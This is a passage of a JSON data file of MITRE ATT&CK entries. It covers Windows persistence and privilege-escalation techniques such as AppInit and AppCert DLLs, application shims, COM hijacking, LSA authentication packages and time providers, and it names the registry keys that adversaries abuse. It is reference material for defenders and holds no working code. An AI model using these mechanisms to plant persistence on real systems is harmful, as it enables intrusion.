        "source_name": "Github Netsh Helper CS Beacon",
        "url": "https://github.com/outflankbv/NetshHelperBeacon",
        "description": "Smeets, M. (2016, September 26). NetshHelperBeacon. Retrieved February 13, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|system",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--7d57b371-10c2-45e5-b3cc-83a8fb380e4c",
    "platform": "windows",
    "tid": "T1546.009",
    "technique": "AppCert DLLs",
    "tactic": "privilege-escalation",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppCertDLLs</code> Registry key under <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\</code> are loaded into every process that calls the ubiquitously used application programming interface (API) functions <code>CreateProcess</code>, <code>CreateProcessAsUser</code>, <code>CreateProcessWithLoginW</code>, <code>CreateProcessWithTokenW</code>, or <code>WinExec</code>. (Citation: Elastic Process Injection July 2017)\n\nSimilar to [Process Injection](https://attack.mitre.org/techniques/T1055), this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity. ",
    "technique_references": [
      {
        "source_name": "Elastic Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Sysinternals AppCertDlls Oct 2007",
        "url": "https://forum.sysinternals.com/appcertdlls_topic12546.html",
        "description": "Microsoft. (2007, October 24). Windows Sysinternals - AppCertDlls. Retrieved December 18, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|system",
    "technique_effective_permissions": "administrator|system",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--7d57b371-10c2-45e5-b3cc-83a8fb380e4c",
    "platform": "windows",
    "tid": "T1546.009",
    "technique": "AppCert DLLs",
    "tactic": "persistence",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppCertDLLs</code> Registry key under <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\</code> are loaded into every process that calls the ubiquitously used application programming interface (API) functions <code>CreateProcess</code>, <code>CreateProcessAsUser</code>, <code>CreateProcessWithLoginW</code>, <code>CreateProcessWithTokenW</code>, or <code>WinExec</code>. (Citation: Elastic Process Injection July 2017)\n\nSimilar to [Process Injection](https://attack.mitre.org/techniques/T1055), this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity. ",
    "technique_references": [
      {
        "source_name": "Elastic Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Sysinternals AppCertDlls Oct 2007",
        "url": "https://forum.sysinternals.com/appcertdlls_topic12546.html",
        "description": "Microsoft. (2007, October 24). Windows Sysinternals - AppCertDlls. Retrieved December 18, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|system",
    "technique_effective_permissions": "administrator|system",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--cc89ecbd-3d33-4a41-bcca-001e702d18fd",
    "platform": "windows",
    "tid": "T1546.010",
    "technique": "AppInit DLLs",
    "tactic": "privilege-escalation",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppInit_DLLs</code> value in the Registry keys <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> or <code>HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. (Citation: Elastic Process Injection July 2017)\n\nSimilar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. (Citation: AppInit Registry) Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity. \n\nThe AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. (Citation: AppInit Secure Boot)",
    "technique_references": [
      {
        "source_name": "Elastic Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "AppInit Registry",
        "url": "https://support.microsoft.com/en-us/kb/197571",
        "description": "Microsoft. (2006, October). Working with the AppInit_DLLs registry value. Retrieved July 15, 2015.",
        "external_id": "none"
      },
      {
        "source_name": "AppInit Secure Boot",
        "url": "https://msdn.microsoft.com/en-us/library/dn280412",
        "description": "Microsoft. (n.d.). AppInit DLLs and Secure Boot. Retrieved July 15, 2015.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator",
    "technique_effective_permissions": "administrator|system",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--cc89ecbd-3d33-4a41-bcca-001e702d18fd",
    "platform": "windows",
    "tid": "T1546.010",
    "technique": "AppInit DLLs",
    "tactic": "persistence",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppInit_DLLs</code> value in the Registry keys <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> or <code>HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. (Citation: Elastic Process Injection July 2017)\n\nSimilar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. (Citation: AppInit Registry) Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity. \n\nThe AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. (Citation: AppInit Secure Boot)",
    "technique_references": [
      {
        "source_name": "Elastic Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "AppInit Registry",
        "url": "https://support.microsoft.com/en-us/kb/197571",
        "description": "Microsoft. (2006, October). Working with the AppInit_DLLs registry value. Retrieved July 15, 2015.",
        "external_id": "none"
      },
      {
        "source_name": "AppInit Secure Boot",
        "url": "https://msdn.microsoft.com/en-us/library/dn280412",
        "description": "Microsoft. (n.d.). AppInit DLLs and Secure Boot. Retrieved July 15, 2015.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator",
    "technique_effective_permissions": "administrator|system",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--42fe883a-21ea-4cfb-b94a-78b6476dcc83",
    "platform": "windows",
    "tid": "T1546.011",
    "technique": "Application Shimming",
    "tactic": "privilege-escalation",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. (Citation: Elastic Process Injection July 2017)\n\nWithin the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. \n\nA list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:\n\n* <code>%WINDIR%\\AppPatch\\sysmain.sdb</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb</code>\n\nCustom databases are stored in:\n\n* <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom</code>\n\nTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).\n\nUtilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc. (Citation: FireEye Application Shimming) Shims can also be abused to establish persistence by continuously being invoked by affected programs.",
    "technique_references": [
      {
        "source_name": "Elastic Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye Application Shimming",
        "url": "http://files.brucon.org/2015/Tomczak_and_Ballenthin_Shims_for_the_Win.pdf",
        "description": "Ballenthin, W., Tomczak, J.. (2015). The Real Shim Shary. Retrieved May 4, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Black Hat 2015 App Shim",
        "url": "https://www.blackhat.com/docs/eu-15/materials/eu-15-Pierce-Defending-Against-Malicious-Application-Compatibility-Shims-wp.pdf",
        "description": "Pierce, Sean. (2015, November). Defending Against Malicious Application Compatibility Shims. Retrieved June 22, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--42fe883a-21ea-4cfb-b94a-78b6476dcc83",
    "platform": "windows",
    "tid": "T1546.011",
    "technique": "Application Shimming",
    "tactic": "persistence",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. (Citation: Elastic Process Injection July 2017)\n\nWithin the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. \n\nA list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:\n\n* <code>%WINDIR%\\AppPatch\\sysmain.sdb</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb</code>\n\nCustom databases are stored in:\n\n* <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom</code>\n\nTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).\n\nUtilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc. (Citation: FireEye Application Shimming) Shims can also be abused to establish persistence by continuously being invoked by affected programs.",
    "technique_references": [
      {
        "source_name": "Elastic Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye Application Shimming",
        "url": "http://files.brucon.org/2015/Tomczak_and_Ballenthin_Shims_for_the_Win.pdf",
        "description": "Ballenthin, W., Tomczak, J.. (2015). The Real Shim Shary. Retrieved May 4, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Black Hat 2015 App Shim",
        "url": "https://www.blackhat.com/docs/eu-15/materials/eu-15-Pierce-Defending-Against-Malicious-Application-Compatibility-Shims-wp.pdf",
        "description": "Pierce, Sean. (2015, November). Defending Against Malicious Application Compatibility Shims. Retrieved June 22, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--bc0f5e80-91c0-4e04-9fbb-e4e332c85dae",
    "platform": "windows",
    "tid": "T1546.015",
    "technique": "Component Object Model Hijacking",
    "tactic": "privilege-escalation",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.(Citation: Microsoft Component Object Model)  References to various COM objects are stored in the Registry. \n\nAdversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.(Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection. ",
    "technique_references": [
      {
        "source_name": "Elastic COM Hijacking",
        "url": "https://www.elastic.co/blog/how-hunt-detecting-persistence-evasion-com",
        "description": "Ewing, P. Strom, B. (2016, September 15). How to Hunt: Detecting Persistence & Evasion with the COM. Retrieved September 15, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "GDATA COM Hijacking",
        "url": "https://blog.gdatasoftware.com/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence",
        "description": "G DATA. (2014, October). COM Object hijacking: the discreet way of persistence. Retrieved August 13, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Component Object Model",
        "url": "https://msdn.microsoft.com/library/ms694363.aspx",
        "description": "Microsoft. (n.d.). The Component Object Model. Retrieved August 18, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--bc0f5e80-91c0-4e04-9fbb-e4e332c85dae",
    "platform": "windows",
    "tid": "T1546.015",
    "technique": "Component Object Model Hijacking",
    "tactic": "persistence",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.(Citation: Microsoft Component Object Model)  References to various COM objects are stored in the Registry. \n\nAdversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.(Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection. ",
    "technique_references": [
      {
        "source_name": "Elastic COM Hijacking",
        "url": "https://www.elastic.co/blog/how-hunt-detecting-persistence-evasion-com",
        "description": "Ewing, P. Strom, B. (2016, September 15). How to Hunt: Detecting Persistence & Evasion with the COM. Retrieved September 15, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "GDATA COM Hijacking",
        "url": "https://blog.gdatasoftware.com/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence",
        "description": "G DATA. (2014, October). COM Object hijacking: the discreet way of persistence. Retrieved August 13, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Component Object Model",
        "url": "https://msdn.microsoft.com/library/ms694363.aspx",
        "description": "Microsoft. (n.d.). The Component Object Model. Retrieved August 18, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--b8cfed42-6a8a-4989-ad72-541af74475ec",
    "platform": "windows",
    "tid": "T1547.002",
    "technique": "Authentication Package",
    "tactic": "persistence",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.(Citation: MSDN Authentication Packages)\n\nAdversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\</code> with the key value of <code>\"Authentication Packages\"=&lt;target binary&gt;</code>. The binary will then be executed by the system when the authentication packages are loaded.",
    "technique_references": [
      {
        "source_name": "Graeber 2014",
        "url": "http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html",
        "description": "Graeber, M. (2014, October). Analysis of Malicious Security Support Provider DLLs. Retrieved March 1, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Configure LSA",
        "url": "https://technet.microsoft.com/en-us/library/dn408187.aspx",
        "description": "Microsoft. (2013, July 31). Configuring Additional LSA Protection. Retrieved June 24, 2015.",
        "external_id": "none"
      },
      {
        "source_name": "MSDN Authentication Packages",
        "url": "https://msdn.microsoft.com/library/windows/desktop/aa374733.aspx",
        "description": "Microsoft. (n.d.). Authentication Packages. Retrieved March 1, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--b8cfed42-6a8a-4989-ad72-541af74475ec",
    "platform": "windows",
    "tid": "T1547.002",
    "technique": "Authentication Package",
    "tactic": "privilege-escalation",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.(Citation: MSDN Authentication Packages)\n\nAdversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\</code> with the key value of <code>\"Authentication Packages\"=&lt;target binary&gt;</code>. The binary will then be executed by the system when the authentication packages are loaded.",
    "technique_references": [
      {
        "source_name": "Graeber 2014",
        "url": "http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html",
        "description": "Graeber, M. (2014, October). Analysis of Malicious Security Support Provider DLLs. Retrieved March 1, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Configure LSA",
        "url": "https://technet.microsoft.com/en-us/library/dn408187.aspx",
        "description": "Microsoft. (2013, July 31). Configuring Additional LSA Protection. Retrieved June 24, 2015.",
        "external_id": "none"
      },
      {
        "source_name": "MSDN Authentication Packages",
        "url": "https://msdn.microsoft.com/library/windows/desktop/aa374733.aspx",
        "description": "Microsoft. (n.d.). Authentication Packages. Retrieved March 1, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--61afc315-860c-4364-825d-0d62b2e91edc",
    "platform": "windows",
    "tid": "T1547.003",
    "technique": "Time Providers",
    "tactic": "persistence",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains.(Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.(Citation: Microsoft TimeProvider)\n\nTime providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of  <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\</code>.(Citation: Microsoft TimeProvider) The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.(Citation: Microsoft TimeProvider)\n\nAdversaries may abuse this architecture to establish persistence, specifically by registering and enabling a malicious DLL as a time provider. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.(Citation: Github W32Time Oct 2017)",
    "technique_references": [
      {
        "source_name": "Github W32Time Oct 2017",
        "url": "https://github.com/scottlundgren/w32time",
        "description": "Lundgren, S. (2017, October 28). w32time. Retrieved March 26, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft W32Time May 2017",
        "url": "https://docs.microsoft.com/windows-server/networking/windows-time-service/windows-time-service-tools-and-settings",
        "description": "Mathers, B. (2017, May 31). Windows Time Service Tools and Settings. Retrieved March 26, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft W32Time Feb 2018",
        "url": "https://docs.microsoft.com/windows-server/networking/windows-time-service/windows-time-service-top",
        "description": "Microsoft. (2018, February 1). Windows Time Service (W32Time). Retrieved March 26, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft TimeProvider",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms725475.aspx",
        "description": "Microsoft. (n.d.). Time Provider. Retrieved March 26, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "system|administrator",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--61afc315-860c-4364-825d-0d62b2e91edc",
    "platform": "windows",
    "tid": "T1547.003",
    "technique": "Time Providers",
    "tactic": "privilege-escalation",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains.(Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.(Citation: Microsoft TimeProvider)\n\nTime providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of  <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\</code>.(Citation: Microsoft TimeProvider) The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.(Citation: Microsoft TimeProvider)\n\nAdversaries may abuse this architecture to establish persistence, specifically by registering and enabling a malicious DLL as a time provider. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.(Citation: Github W32Time Oct 2017)",
    "technique_references": [
      {
        "source_name": "Github W32Time Oct 2017",
        "url": "https://github.com/scottlundgren/w32time",
        "description": "Lundgren, S. (2017, October 28). w32time. Retrieved March 26, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft W32Time May 2017",
        "url": "https://docs.microsoft.com/windows-server/networking/windows-time-service/windows-time-service-tools-and-settings",
        "description": "Mathers, B. (2017, May 31). Windows Time Service Tools and Settings. Retrieved March 26, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft W32Time Feb 2018",
        "url": "https://docs.microsoft.com/windows-server/networking/windows-time-service/windows-time-service-top",
        "description": "Microsoft. (2018, February 1). Windows Time Service (W32Time). Retrieved March 26, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft TimeProvider",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms725475.aspx",
        "description": "Microsoft. (n.d.). Time Provider. Retrieved March 26, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "system|administrator",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--6836813e-8ec8-4375-b459-abb388cb1a35",
    "platform": "windows",
    "tid": "T1547.004",
    "technique": "Winlogon Helper DLL",
    "tactic": "persistence",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\\Software[\\\\Wow6432Node\\\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> and <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> are used to manage additional helper programs and functionalities that support Winlogon.(Citation: Cylance Reg Persistence Sept 2013) \n\nMalicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013)\n\n* Winlogon\\Notify - points to notification package DLLs that handle Winlogon events\n* Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on\n* Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on\n\nAdversaries may take advantage of these features to repeatedly execute malicious code and establish 